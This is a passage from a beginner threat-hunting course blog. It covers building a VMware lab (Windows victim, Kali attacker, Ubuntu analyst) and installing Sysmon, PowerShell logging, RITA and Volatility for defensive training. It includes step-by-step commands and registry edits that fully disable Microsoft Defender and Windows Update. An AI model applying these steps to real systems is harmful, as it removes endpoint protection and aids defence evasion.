---
title: "Threat Hunting Standard Dll-Injected C2 Implants (Practical Course)"
date: 2023-07-12T02:01:58+05:30
description: "In this beginner-friendly practical course we'll learn how to threat hunt standard DLL-injected C2 implants. We'll set up our own virtual environment, perform the attack, perform our threat hunting analysis, as well as write a report on our findings."
tags: [threat_hunting, C2, dll_injection_attacks]
author: "faan | ross"
draft: true
---

*** 

# Hello friend, so glad you could make it.

{{< figure src="/img/poe.gif" title="" class="custom-figure" >}}

`This is the first in an ongoing + always-evolving series on threat hunting.`

[NOTE: FOR THE VIDEO VERSION OF THIS COURSE CLICK HERE]()

The main thing I want you to know about this course is that ***we will learn by doing***. 

`(1)` We'll start off by creating + configuring our own virtual network, including systems for both the victim and attacker. `(2)` Then, instead of using prepackaged data, we'll perform the attack ourselves. `(3)` We'll then perform the actual threat hunt, gathering data through multiple facets of both live and post-mortem analysis. `(4)` Finally we'll learn how to crystallize all our insights in a report so we can effectively communicate our findings to the greater cybersecurity ecosystem. 

I will interject with theory when and where necessary, as well as provide extensive references in each associated section. If something is unclear I encourage you to take a sojourn in the spirit of returning with an improved understanding of our topic at hand.

{{< figure src="/img/brentleave.gif" title="" class="custom-figure" >}}

As mentioned in the opening line - this is the first course in an ongoing series I have intentionally labelled ***always-evolving***. By this I mean perpetual evolution both as it relates to our approach, as well as our setup. Our approach - the specific tools and techniques we employ - will not only diversify in upcoming courses, but indeed we'll also get to gain a deeper sense of mastery of all the core threat hunting tools. And we'll continue to add to our virtualized setup, meaning in each subsequent course we'll spend some time in the beginning to fine tune our network with the goal of becoming increasingly representative of "real-world" situations. 

All to say: I see this whole series of courses on threat hunting as a journey where you and I will learn together. As we get better, it's natural that we not only feel able to handle more complexity - but indeed we'll desire to do so. I'm going to do my best to progressively structure it in such a manner as to optimize the relationship between our skill and the challenge on offer. 

But for now, since this is our first course, we'll begin our journey at the start.

{{< figure src="/img/begins.gif" title="" class="custom-figure" >}}

Threat Hunting is not typically seen as an "entry-level" cybersecurity discipline, probably because in a certain sense it is a layer of abstraction woven from other, more "fundamental", layers of abstraction. I have however `created this course specifically with the beginner in mind`. What that practically entails is that I do my best to not indulge in pedantry while providing sufficient information so that you can follow along not only with what we are doing, but crucially, ***why we are doing it***.

Further, I also believe in the merit of a top-down learning approach - instead of mastering all the fundamental fields of knowledge, start with the final application and then work your way back to understand the reason for their inclusion. All this to say - `if you are beginner and you are curious about Threat Hunting then you are in the right place`. I can promise that if you venture along by the end of our journey many so-called "advanced" topics will appear in a whole new light since you've established a connection between the concept and the actual application. 

{{< figure src="/img/watermelon.gif" title="" class="custom-figure" >}}

`This first course is focused on threat hunting standard DLL-injected C2 implants.`



Here's a quick overview of the entire course: 
1. **Setting up our Virtual Environment**
    - Introduction
3. **Performing the Attack**
4. **Attack Review (Shenanigans!)**
    - subsections
5. **Live Forensics: Native Windows Tools**
    - subsections
6. **Live Forensics: Process Hacker 2**
    - subsections
7. **Post-Mortem Forensics: Memory**
    - subsections
8. **Post-Mortem Forensics: Log Analysis**
    - subsections
9. **Post-Mortem Forensics: Traffic Analysis**
    - subsections
10. **Report write-up**
    - subsections
11. **List of all references**
12. **Cheat Sheets**

Finally I do want to add that I myself am an `eternal student` and always learning. Creating these courses are part of my own pedagogical process, and as such it's possible, even perhaps probable, that I will make some mistakes. Mistakes themselves of course represent the opportunity for further education - but only if we become aware of them. So if there's anything here you are unsure about, or simply flat-out disagree with `PLEASE` feel free to reach out and share this with me so that everyone can potentially benefit from improved understanding. You can send me a message on Twitter [here](https://twitter.com/faanross), of feel free to email me [here](mailto:moi@faanross.com).

So without any further preamble, ***LET'S GET IT***.

{{< figure src="/img/randy01.gif" title="" class="custom-figure" >}}

***

# 1. Setting up our Virtual Environment
# Introduction

In this section we'll set up the three VMs we'll need for the course - Windows 10 (Victim), Kali Linux (Attacker), Ubuntu 20.04 (Post-Mortem Analysis). First we'll download the iso files, then we'll install the operating systems, and finally we'll configure them.

# Requirements

{{< figure src="/img/tripleram.gif" title="" class="custom-figure" >}}

I do want to give you some sense of the hardware requirements for this course, however I also have to add that I am not an expert in this area. ***AT ALL.*** So I'll provide an overview of what we'll be running, as well as what I think this translates to in terms of host resources (ie your actual system). But please - if you disagree with my estimation and believe you can finagle your way to getting the same results by adapting the process, then I salute you for that is the *way of the hacker*. 

As mentioned above, we'll have 3 VMs, however, at any one moment there will only be a `maximum of 2 VMs running`. For each of these VMs I recommend the following broad system resources:
- min 2 (ideally 4) CPU cores
- min 4 (ideally 8) GB RAM
- around 60 GB HD space (allocated)

So based on this, that is roughly 2x the above + resources for your actual host system, you would likely need something along the lines of:
- 8 CPU cores (12+ even better)
- 16 GB RAM (32+ even better)
- 200 GB free HD space

{{< figure src="/img/beefcake.gif" title="" class="custom-figure" >}}

I understand this is beefy, but consider:
- You don't have to use a single system to run the entire VLAN - you could create an actual physical network, for ex with a Raspberry Pi cluster, and run the VMs on that. Or mini-pcs, or refurbished clients - really for a few hundred dollars you could more than easily be equipped to run a small network. I don't want to sound insensitive to a few 100 dollars, but I'm gonna level with you: if you want to learn cybersecurity then there is no better investment than having localized resources to create virtual simulations. 
- In case you don't want to invest up-front but don't mind paying some running costs: You can also use a service like [Linode](https://www.linode.com) and simply rent compute via the cloud. In other words you'll rent a system in the cloud and run the VM on that. 

Finally I want to mention that everything we will use is completely free. This course ain't upselling a full course, and every piece of software is freely available. The only exception has free alternatives, and I'm about to discuss that with you right now. 

# Hosted (type 2) Hypervisor
So in the off-chance you don't know: a hosted (type 2) hypervisor is the software that allows us to run virtual machines on top of our base operating system. It's kinda like Inception - it allows us to create machines within our machine. 

{{< figure src="/img/inception.gif" title="" class="custom-figure" >}}

For this course I'll be using [VMWare Workstation](https://store-us.vmware.com/workstation_buy_dual) which as of writing costs around $200. However you could also do it with either [VMWare Player](https://www.vmware.com/ca/products/workstation-player.html), or [Oracle Virtualbox](https://www.virtualbox.org/wiki/Downloads), both of which are free. 

Note that some of the details of the setup might be slightly different if you choose to use either of the free options, and if that occurs then it'll be up to you to figure that out. Google, ChatGPT, StackExchange etc. 

`So at this point please take a moment to download and install the hypervisor of your choice.`
And if you've never (ever) used any hypervisor before then you might want to find an introductory tutorial to simply orient yourself with regards to the basic interface and functionality. 

Once your hypervisor is installed and you feel at least a modicum of comfort in interacting with it you can proceed...

{{< figure src="/img/pleasego.gif" title="" class="custom-figure" >}}

# Virtual Machine Images (iso files)

Please download the following three iso's:
* for the victim we'll use [Windows 10 Enterprise Evaluation 32-bit](https://info.microsoft.com/ww-landing-windows-10-enterprise.html)
* for the attacker we'll use [Kali Linux](https://www.kali.org/get-kali/#kali-installer-images)
* for post-mortem analysis we'll be using [Ubuntu Linux 20.04 Focal Fossa](https://releases.ubuntu.com/focal/). Just note here the actual edition 20.04 is important since we'll run RITA on it, which, as of writing, runs best on Focal Fossa.

Ok so at this point if you have your hosted hypervisor installed, and all three iso's are downloaded we are ready to proceed.

# VM 1: Windows 10 aka "The Victim" 

{{< figure src="/img/screamdrew.gif" title="" class="custom-figure" >}}
 
# Installation

1. In VMWare Workstation goto `File` -> New Virtual Machine. 
2. Choose `Typical (recommended)`, then click `Next`. 
3. Then select `I will install the operating system later` and hit `Next`.

{{< figure src="/img/image001.png" title="" class="custom-figure" >}}

4. Select `Microsoft Windows`, and under Version select `Windows 10`. 
5. Here you are free to call the machine whatever you'd like, in my case I am calling it `Victim`. 
6. Select 60 GB and `Split virtual disk into multiple files`. 
7. Then on the final screen click on `Customize Hardware`.

{{< figure src="/img/image002.png" title="" class="custom-figure" >}}

8. Under `Memory` (see left hand column) I suggest at least 4096 MB, if possible given your available resources then increase it to 8192 MB. 
9. Under `Processors` I suggest at least 2, if possible given your available resources then increase it to 4.
10. Under `New CD/DVD (SATA)` change Connection from Use Physical Drive to `Use ISO image file`. Click `Browse…` and select the location of your Windows 10 iso file.

{{< figure src="/img/image003.png" title="" class="custom-figure" >}}

You should now see your VM in your Library (left hand column), select it and then click on `Power on this virtual machine`.

{{< figure src="/img/image004.png" title="" class="custom-figure" >}}

Wait a short while and then you should see a Windows Setup window. Choose your desired language etc, select Next and then click on Install Now. Select ‘I accept the license terms’ and click Next. Next select ‘Custom: Install Windows only (advanced)’, and then select your virtual HD and click Next.

{{< figure src="/img/image005.png" title="" class="custom-figure" >}}

Once its done installing we’ll get to the setup, select your region, preferred keyboard layout etc. Accept the License Agreement (if you dare!). Now once you reach the Sign in page don’t fill anything in, rather select ‘Domain join instead’ in the bottom left corner.

{{< figure src="/img/image006.png" title="" class="custom-figure" >}}

Choose any username and password, in my case it'll be the highly original choice of `User` and `password`, feel free to choose something else. Then choose 3 security questions, since this is a "burner" system used for the express purpose of this course don't overthink it. Turn off all the privacy settings (below), and for Cortana select `Not Now`.

{{< figure src="/img/image007.png" title="" class="custom-figure" >}}

Windows will now finalize installation + configuration, this could take a few minutes, whereafter you will see your Desktop.

# VMWare Tools
Next we'll install VMWare Tools which will ensure our VMs screen resolution assumes that of our actual monitor, but more importantly it also gives us the ability to copy and paste between the host and the VM. 

So just to be sure, at this point you should be staring at a Windows desktop. Now in the VMWare menu bar click `VM` and then `Install VMWare Tools`. If you open explorer (in the VM) you should now see a D: drive. 

{{< figure src="/img/image008.png" title="" class="custom-figure" >}}

Double-click the drive, hit `Yes` when asked if we want this app to make changes to the device. Hit `Next`, select `Typical` and hit `Next`. Finally hit `Install` and then once done `Finish`. You'll need to restart your system for the changes to take effect, but we'll shut it down since we need to change a setting. So hit the Windows icon, Power icon, and then select `Shut Down`.

Right-click on your VM and select `Settings`. In the list on the LHS select `Display`, which should be right at the bottom. On the bottom - deselect `Automatically adjust user interface size in the virtual machine`, as well as `Strech mode`, it should now look like this:

{{< figure src="/img/image009.png" title="" class="custom-figure" >}}

Go ahead and start-up the VM once again, we'll now get to configuring our VM.

# Deep disable MS Defender + Windows updates

I call this 'deep disable' because simply toggling off the switches in `Settings` won't actually fully disable Defender and Updates. You see, Windows thinks of you as a younger sibling - it feels the need to protect you a bit, most of the time without you even knowing. (Unlike Linux of course which will allow you to basically nuke your entire OS if you so desired.) 

{{< figure src="/img/winlin.jpeg" title="" class="custom-figure" >}}

And just so you know why it is we're doing this:
- We are disabling Defender so that the AV won't interfere with us attacking the system. Now you might think well this represents an unrealistic situation since in real-life we'll always have our AV running. Thing is, this is a simulation - we are simulating an actual attack. Yes the AV might pick up on our mischievous escapades here since we are using very well-known and widely-used malware (Metasploit mainly). But, if you are being attacked by an actual threat actor worth their salt they likely won't be using something so familiar as default Metasploit modules - they will likely be capable of using analogous but obfuscated technologies that your AV will not pick up on.
- As for updates, we disable this because sometimes we can spend all this time configuring and setting things up and then one day we boot our VM up, Windows does it's whole automatic update schpiel, and suddenly things are broken. This is thus simply to support the stability of our long-term use of this VM. 

1. **Disable Tamper Protection**
    1. Hit the `Start` icon, then select the `Settings` icon.
    2. Select **`Update & Security `**.
    3. In LHS column, select `Windows Security`, then click `Open Windows Security`.
    4. A new window will pop up. Click on `Virus & threat protection`.
    5. Scroll down to the heading that says `Virus & threat protection settings` and click on `Manage settings`.
    6. There should be 4 toggles in total, we are really interested in disabling `Real-time protection`, however since we are here just go ahead and disable all of them. 
    7. Note that Windows will warn you and ask if you want to allow this app to make changes to the device, hit `Yes`.
    8. All 4 toggle settings should now be disabled.

{{< figure src="/img/image010.png" title="" class="custom-figure" >}}
    
2. **Disable the Windows Update service**
    1. Open the Run dialog box by pressing Win+R.
    2. Type **`services.msc`** and press Enter.
    3. In the Services list, find **`Windows Update`**, and double-click it.
    4. In the Windows Update Properties (Local Computer) window, under the **`General`** tab, in the **`Startup type:`** dropdown menu, select **`Disabled`** - see image below.
    5. Click **`Apply`** and then **`OK`**.
    
 {{< figure src="/img/image011.png" title="" class="custom-figure" >}}

3. **Disable Defender via Group Policy Editor**
    1. Open the Run dialog box by pressing Win+R.
    2. Type `gpedit.msc` and hit enter. The `Local Group Policy Editor` should have popped up.
    3. In the tree on the LHS navigate to the following: `Computer Configuration` > `Administrative Templates` > `Windows Components` > `Microsoft Defender Antivirus`.
    4. In the RHS double-click on `Turn off Microsoft Defender Antivirus`.
    5. In the new window on the top left select `Enabled` - see image below. 
    6. First hit `Apply` then `OK`.

 {{< figure src="/img/image012.png" title="" class="custom-figure" >}}

4. **Disable Updates via Group Policy Editor**
    1. Still in `Local Group Policy Editor`, navigate to: `Computer Configuration` > `Administrative Templates` > `Windows Components` > `Windows Update`.
    2. In the RHS double-click on `Configure Automatic Updates`.
    3. Select `Disabled`, then click `Apply` and `OK`.

{{< figure src="/img/image013.png" title="" class="custom-figure" >}}

5. **Disable Defender via Registry**
    1. In the search bar on the bottom type `cmd`.
    2. On the top left, right under `Best match` you should see `Command Prompt`.
    3. Right-click and select `Run as administrator`, hit `Yes`.
    4. Copy and paste the following command below into your command prompt and hit enter.
    ```
    REG ADD "hklm\software\policies\microsoft\windows defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
    ```
    
Almost there! We just need to boot into Safe Mode to make some final adjustments to the registry and then we are good to go.

6. **Reboot system in Safe Mode**
    1. Open the Run dialog box by pressing Win+R.
    2. Write `msconfig` and hit enter.
    3. Select the `Boot` tab.
    4. Under `Boot options` select `Safe boot`, ensure `Minimal` is selected - see image below. 
    5. Hit `Apply` first, the `OK`.
    6. Select `Restart`.
    
{{< figure src="/img/image014.png" title="" class="custom-figure" >}}

7. **Disable Defender via Registry**
    1. Open the Run dialog box by pressing Win+R.
    2. Write `regedit` and hit enter, this should bring up the `Registry Editor`.
    3. Below you will see a list of 6 keys. For each of these keys you will follow the same process: once the key is selected find the `Start` value in the RHS, double-click, change the value to `4` and hit `OK` - see image below.
    - `Computer` > `HKEY_LOCAL_MACHINE` > `SYSTEM` > `CurrentControlSet` > `Services` > `Sense`
    - `Computer` > `HKEY_LOCAL_MACHINE` > `SYSTEM` > `CurrentControlSet` > `Services` > `WdBoot`
    - `Computer` > `HKEY_LOCAL_MACHINE` > `SYSTEM` > `CurrentControlSet` > `Services` > `WinDefend`
    - `Computer` > `HKEY_LOCAL_MACHINE` > `SYSTEM` > `CurrentControlSet` > `Services` > `WdNisDrv`
    - `Computer` > `HKEY_LOCAL_MACHINE` > `SYSTEM` > `CurrentControlSet` > `Services` > `WdNisSvc`
    - `Computer` > `HKEY_LOCAL_MACHINE` > `SYSTEM` > `CurrentControlSet` > `Services` > `WdFilter`

{{< figure src="/img/image015.png" title="" class="custom-figure" >}}

8. **Disable Updates via Registry**
    1. Still in `Registry Editor` let's navigate to the following:
    - `Computer` > `HKEY_LOCAL_MACHINE` > `SOFTWARE` > `Microsoft` > `Windows` > `CurrentVersion` > `WindowsUpdate` > `Auto Update`
    2. Right-click the `Auto Update` key, select `New`, and then click `DWORD (32-bit) Value`.
    3. Name the new key **`AUOptions`** and press Enter.
    4. Double-click the new **`AUOptions`** key and change its value to **`2`**. Click **`OK`** - see image below.
    5. Close Registry Editor.

{{< figure src="/img/image016.png" title="" class="custom-figure" >}}

9. **Leave Safe Mode**
    1. All that's left to do is get back into our regular Windows environment.
    2. Open the Run dialog box by pressing Win+R.
    3. Write `msconfig` and hit enter.
    4. Select `Boot` tab.
    5. Deselect `Safe boot`, hit `Apply`, hit `OK`.
    6. Hit `Restart`.

And that, I can promise you, is by far the most boring part of this entire course. But I did it on purpose - this is very important if you are going to start simulating attacks and threat hunting on your own system. And the cool thing is now that we've done it we'll also learn how to create templates + clones in bit, meaning hence forth when you want a victim Windows 10 VM you can simply clone this one with a few clicks instead of going through that entire process again. But before that, let's setup all the awesome tools we'll be using in this course. 

# Sysmon 

You should now be back in the normal Windows environment looking at your Desktop. Let' set up `Sysmon` - a simple, free, Microsoft-owned program that will DRAMATICALLY improve our logging ability. 

The reason we do this and not simply rely on the standard `Windows Event Logs` (hence forth referred to simply as `WEL`), is that WEL was clearly designed by someone who considered security unimportant. Ask most security professionals what they think of WEL and you'll probably get either a sarcastic chuckle or a couple of expletives. All to say - it sucks. REAL bad. BUt there's hope... 

Sysmon, created by the legend [Mark Russinovich](https://twitter.com/markrussinovich), takes about 5 minutes to set up and will DRAMATICALLY improve logging, specifically as it relates to security events. In case you wanted to learn more about Sysmon's ins and outs [see this talk](https://www.youtube.com/watch?v=6W6pXp6EojY). And if you really wanted to get in deep, which at some point I recommend you do, see [this playlist](https://www.youtube.com/playlist?list=PLk-dPXV5k8SG26OTeiiF3EIEoK4ignai7) from TrustedSec. Finally here is another great talk by one of my favourite SANS instructors (Eric Conrad) on [using Sysmon for  Threat Hunting](https://www.youtube.com/watch?v=7dEfKn70HCI).

Before we get installing Sysmon there's just one thing you need to know - in addition to downloading the actual Sysmon file we also need a config file. One day when you get to *that* level you can even create your own config file, which will allow you to make it behave exactly how you want it to. But for now, since we are decidedly not yet there, let's download and use one made by some really smart people. Of late  I have heard a few trusted sources, included [Eric Conrad](https://www.ericconrad.com) prefer [this version from Neo23x0](https://github.com/bakedmuffinman/Neo23x0-sysmon-config) whose authors included another blue team giant, [Florian Roth](https://twitter.com/cyb3rops?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Eauthor). 

So first download the config file (which is in xml format) from the link above, then [go here to download Sysmon](https://download.sysinternals.com/files/Sysmon.zip). You should now have two zip files - the config you downloaded from Github, as well as the Sysmon zip file. Extract the Sysmon file, the contents should look as follows:

{{< figure src="/img/image017.png" title="" class="custom-figure" >}}

Now also extract the zip file containing the config. Inside of the folder rename `sysmonconfig-export.xml` to `sysmonconfig.xml`. Now simply cut (or copy) the file and paste it in the folder containing `Sysmon`. 

Great, everything is set up so now we can install it with a simple command. Open command prompt as administrator and navigate to the folder containing `Sysmon` and the config file - in my case it is `c:\Users\User\Downloads\Sysmon`. Run the following command:

```
Sysmon.exe -accepteula -i
```

This is what a successful installation will look like

{{< figure src="/img/image018.png" title="" class="custom-figure" >}}

Now let's just validate that it's running. First type `powershell` so we change over into a PS shell, then run the command `Get-Service sysmon`. In the image below we can see it is running - we are good to go!

{{< figure src="/img/image019.png" title="" class="custom-figure" >}}

That's it for Sysmon, now let's enable PowerShell logging. 

# PowerShell Logging

For security purposes, another quick and easy proverbial switch we can flip is enabling PowerShell logging. This is great because one specific type of PowerShell logs (`ScriptBlock`) will record exactly what command was run in PowerShell. As we know, in-line with the `Living off the Land` paradigm, modern adversaries LOVE abusing PowerShell; and so the ability to see  exactly what commands were run is obviously a huge boon. 

Something to be aware of is that there are a few types of PowerShell logging: Module, ScriptBlock, Operational, Transcription, Core, and Protected Event. For the purposes of this course we will only be activating `ScriptBlock`, as well as `Operational`. While activating the former tells PowerShell to log the commands, we also need to activate `Operational` so that the system is able to properly save the logs. 

NOTE: This entire process could be performed in the GUI using `Group Policy Editor`, we will however be performing it via PowerShell command line. You should **always** prefer this method to using the GUI. Not simply to look cool, nay, there is a very good practical reason for this.

Imagine for a moment you needed to activate this feature on 1000 stations. You could either do so by logging into each station individually and interacting with the `gpedit` GUI interface, which would likely take you a few days working at a ferocious pace like an automaton for 1000 stations. Alternatively, you could run a single command from a domain controller, which would take less than a minute for 1000 stations. 

This is an admittedly dramatic way of saying that performing administrative tasks using PowerShell commands scales well, while flipping GUI toggles does not scale at all. So invest your time early on learning the methods that don't break down the moment you need to do it at scale, it's so worth it. 

{{< figure src="/img/worth.gif" title="" class="custom-figure" >}}

So open up PowerShell as an administrator and run the following commands.
1. First we'll set the execution policy to allow us to make the changes:
```
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine
```
2. We'll now create a new registry path for `ScriptBlockLogging`:
```
New-Item -Path HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging -Force
```
3. Now create a new DWORD property EnableScriptBlockLogging and set its value to 1:
```
New-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging -Name EnableScriptBlockLogging -Value 1 -PropertyType DWord -Force
```
4. And finally we'll enable Operational logging to ensure our ScriptBlock logs are saved properly:
```
wevtutil sl "Microsoft-Windows-PowerShell/Operational" /e:true
```

# Install Software

And now finally we'll install four programs:
- We'll use **Process Hacker** for live memory forensics 
- We'll use **winpmem** to create a memory dump for post-mortem memory forensics 
- We'll use **Wireshark** to generate a pcap for egress analysis

You can download [Process Hacker here](https://processhacker.sourceforge.io/downloads.php). Once downloaded go ahead and install.

You can download the latest release of [winpmem here](https://github.com/Velocidex/WinPmem/releases). Since its a portable executable there is no installation required, just download the `.exe` file and place it on the desktop. 

And finally the `WireShark` setup file can be [downloaded from here](https://2.na.dl.wireshark.org/win32/Wireshark-win32-3.6.15.exe). Once downloaded run Setup, just keep all options per default, nothing fancy required. 

That's it friend. We are done with BY FAR the heaviest lifting in terms of VM setup - the next two will be a breeze. But before we get to that there's one very simple thing we can do that will make our lives much easier in the future - turning this VM into a template for cloning.

# Creating a Template 

{{< figure src="/img/mememe.gif" title="" class="custom-figure" >}}

So why do we want to do this? Well by turning this VM we just created into a template we are in essence creating an archetype (blueprint). Then, whenever we want this same "victim" system for any project or course we can simply clone it. Thus instead of repeating this entire, rather cumbersome process we can click a few buttons and have it ready to go in under a minute. This is also useful if we ever "mess up" the VM, we can just come back to this starting point where the machine is fresh, but all our configurations and software are as required. 

1. First shut down the VM.
2. In VMWare you should see the library pane on the LHS listing our VM. If you don't, hit `F9`, or go to `View` > `Customize` > `Library`.
3. Right-click on our VM (`Victim`), select `Snapshot` > `Take Snapshot`.
4. Name it anything you'd like, I will be calling it `Genesis`. Hit `Take Snapshot`.
5. Again right-click the VM and select `Settings`. 
6. On the top left we can see two tabs - `Hardware` and `Options`, select `Options`.
7. Go down to the bottom and select `Advanced`.
8. Select `Enable Template mode (to be used for cloning)`, hit `OK`.

{{< figure src="/img/image021.png" title="" class="custom-figure" >}}

9. Note you might want to rename this VM to something like `Victim Template`, so we are aware this is the template that we should not be using, but rather use for cloning. You can do this under `Settings` > `Options` > `General`.

{{< figure src="/img/image022.png" title="" class="custom-figure" >}}

10. Now let's create our first clone which we will actually be using in the course. Right-click on `Victim Template`, select `Manage` > `Clone`. Hit `Next`.
11. We'll select the snapshot we created and hit `Next`. 
12. Keep selection as `Create a linked clone` and hit `Next`. 
13. Give your clone a name, I will be calling it `Victim01`. Choose a location and hit `Next`.

That's it! You should now see both `Victim Template` and `Victim01` in your library.

The bad news - we still have two VMs to install. The good news - they will require minimal-to-no configuration, so at this point we're about 80% done with our VM setup. So let's get it done.

# VM 2: Kali Linux aka "The Attacker" 
{{< figure src="/img/attacker.gif" title="" class="custom-figure" >}}

We'll be using Kali Linux to simulate the adversary. The great thing about Kali Linux is that everything we'll need comes pre-packaged, so we just have to install the actual operating system. 

1. In VMWare hit `File` > `New Virtual Machine...`
2. `Typical (recommended)` and hit `Next`. 
3. `I will install the operating system later` and hit `Next`.
4. Select `Linux`, and under Version select `Debian 11.x 64-bit`. (Note: Kali Linux is built on top of Debian Linux).

{{< figure src="/img/image023.png" title="" class="custom-figure" >}}

5. Again call the machine whatever you'd like, in my case I am calling it `Hacker`. 
6. Increase the Maximum disk size to 60 GB and select `Split virtual disk into multiple files`. 
7. Then on the final screen click on `Customize Hardware`.
8. Under `Memory` I suggest at least 4096 MB, if possible given your available resources then increase it to 8192 MB. 
9. Under `Processors` I suggest at least 2, if possible given your available resources then increase it to 4.
10. Under `New CD/DVD (SATA)` change Connection from Use Physical Drive to `Use ISO image file`. Click `Browse…` and select the location of your Kali Linux iso image.
11. And again for `Network Adapter` we'll keep it as either `NAT` or `Bridged` for now. Click `Close` then `Finish`.

So now let's get to actually installing it:
1. Right-click on the VM and select `Power` > `Start Up Guest`.
2. Select `Graphical Install`.
3. Select language, country etc.
4. Choose any `Hostname`, leave `Domain name` blank, for Full name and username I chose `hacker`.
5. Create a password, again though OBVIOUSLY not a suggested real-world practice, in these simulations I tend to simply use `password` since it minimizes any administrative friction. 
6. Choose a timezone.
7. Next select `Guided - use entire disk` and hit `Continue`.
8. The only disk should be selected, hit `Continue`.
9. Keep `All files in one partition (recommended for new users)`, hit `Continue`.
10. Keep `Finish partitioning and write changes to disk`, hit `Continue`.
11. Select `Yes` and `Continue`.
12. In `Software selection` keep the default selection and hit `Continue`. Kali will now start installing, just be aware this can take a few minutes, probably around 5 to 10. 

{{< figure src="/img/image024.png" title="" class="custom-figure" >}}

13. Next it'll ask you about installing a GRUB boot loader, keep it selected as `Yes` and hit `Continue`. 
14. Select `/dev/sda` and hit `Continue`. More installing... 

{{< figure src="/img/image025.png" title="" class="custom-figure" >}}

15. Finally it will inform us it's complete, we can hit `Continue` causing the system to reboot into Kali Linux. Enter your username and password and hit `Log In`.
16. Let's shut down the VM, then right-click on it in the library and select `Settings`. Under `Display` deselect `Stretch mode` and hit `OK`.

{{< figure src="/img/image026.png" title="" class="custom-figure" >}}

And that's it for our attacker machine - feel free to repeat the Template-Cloning process we performed for our Windows 10 VM if you so desire.

# VM 3: Ubuntu Linux 20.04 aka "The Analyst" 
{{< figure src="/img/analysis.gif" title="" class="custom-figure" >}}

And now finally we'll set up our Ubuntu VM, afterwards we'll install RITA (incl Zeek), and Volatility. 

1. In VMWare hit `File` > `New Virtual Machine...`
2. `Typical (recommended)` and hit `Next`. 
3. `I will install the operating system later` and hit `Next`.
4. Select `Linux`, and under Version select `Ubuntu 64-bit`.
5. Again call the machine whatever you'd like, in my case I am calling it `Analyst`. 
6. Increase the Maximum disk size to 60 GB and select `Split virtual disk into multiple files`. 
7. Then on the final screen click on `Customize Hardware`.
8. Under `Memory` I suggest at least 4096 MB, if possible given your available resources then increase it to 8192 MB. 
- NOTE: Keep in mind that you will never run more than 2 VMs at the same time (Victim + Hacker), this VM will always only run by itself after the simulated attack. 
9. Under `Processors` I suggest at least 2, if possible given your available resources then increase it to 4.
10. Under `New CD/DVD (SATA)` change Connection from Use Physical Drive to `Use ISO image file`. Click `Browse…` and select the location of your Ubuntu Linux 20.04 iso image. Make sure `Connect at power on` is enabled.
11. And again for `Network Adapter` we'll keep it as either `NAT` or `Bridged` for now. Click `Close` then `Finish`.

So now let's get to actually installing it:
1. Right-click on the VM and select `Power` > `Start Up Guest`.
2. Select `Try or Install Ubuntu`.
3. Once it boots up the GUI, select `Install Ubuntu`.

{{< figure src="/img/image027.png" title="" class="custom-figure" >}}

4. Select your keyboard and language, hit `Continue`.
5. Keep `Normal Installation` selected, unselect `Download updates while installing Ubuntu`.

{{< figure src="/img/image028.png" title="" class="custom-figure" >}}

6. Keep `Erase disk and install Ubuntu` selected, then hit `Install Now`. 
7. For the popup asking if you want to `Write the changes to disks?`, hit `Continue`.
8. Choose a timezone and hit `Continue`.
9. Now fill in your name and desired credentials, I'll be using `analyst` and `password`.
10. When it's complete you can power the system off. Go into settings, under `CD/DVD (SATA)` disable `Connect at power on`.
11. Then goto `Display`, disable `Stretch mode`.
12. Hit `OK`, start the VM up once again, log in.

`NOTE: A few moments after logging in and answer Ubuntu's questions you'll be asked whether you want to upgrade. IMPORTANT: Do not do so, decline the offer.`

{{< figure src="/img/image029.png" title="" class="custom-figure" >}}

OK, that's it and now finally we'll install RITA, Zeek, and Volatility.

# RITA + Zeek

Here's the cool thing about RITA: it will automatically install Zeek (and MariaDB btw) when you install it. Even better, it actually makes alterations to the standard Zeek config which will serve us even better - I'll discuss the exact details of this and why it's important when we get to that section in our course. For now let's get to installing.

1. Goto the [RITA Github repo](https://github.com/activecm/rita).
2. Scroll down to `Install` and follow the instructions using the `install.sh` script. During installation you will be asked a few questions, answer `y` and hit enter each time. 
3. Let's check the version of RITA to ensure installation was successful. First close your terminal and reopen and then run the commands seen in image below, you should get similar results. 

{{< figure src="/img/image030.png" title="" class="custom-figure" >}}

# Volatility

Similarly to RITA we'll install Volatility by downloading/cloning the repo.
1. Either download the zip file from the repo [here](https://github.com/volatilityfoundation/volatility3), or run the command below from terminal to clone the repo
```
git clone https://github.com/volatilityfoundation/volatility3.git
```
2. Next we'll need to install `pip`, which is a package manager for Python (Volatility is written in Python). We'll do this so we can install all the required package dependencies. Run the following commands:
```
sudo apt update
sudo apt install python3-pip
```
3. Once that's complete we can install our package dependencies. Open a terminal and navigate to where you installed/cloned Volatility. Now simply run the following command:
```
pip3 install -r requirements.txt
```
4. We're done, feel free to shut down your Ubuntu VM as we won't be using it for some time. 

OK. Do you know what time it is? Yeah it's time for all this installing and configuring to pay off - and we kick things off by emulating the attacker! Let's get it!

{{< figure src="/img/strangelove.gif" title="" class="custom-figure" >}}

***

# 2. Performing the Attack 
# Introduction 
Why are we performing the attack ourselves? Why didn't I just do it, export all the requisite artifacts, and share this with you? Why did I make you go through this rigmorale - is it simply that I am cruel?

{{< figure src="/img/cruel.gif" title="" class="custom-figure" >}}

Nah. The reason is pretty simple - I have a deep sense of conviction in the idea that you can only truly "get" defense if you equally "get" offense. If I just black box that entire process then once we start hunting everything is abstract - the commands we ran, the files we used, the techniques we employed etc are all just ideas. So when you then learn to threat hunt these things that exists as nothing more than ideas for you, then you'll most be memorizing - if X happens then I do Y.

But, if instead you do the attack first and learn everything involved by doing it yourself, it does not exist as an abstract idea but as a concrete experience. I think then when you perform the threat hunt, because you have a connection to these things you are hunting (since you created them), well then you learn less through memorization and more through understanding. At least this has been my experience as well as that of many, *much* smarter people than myself. 

So let's jump into a bit of theory that will help us understand just what we are getting up to once we get to the actual attack, which will follow immediately afterwards.

# Theory
# what is a DLL?
As succinct as possible, a DLL is a file containing shared code. It's not a program or an executable in and of itself, rather a DLL is in essence a collection of functions and data that can be used by other programs. 

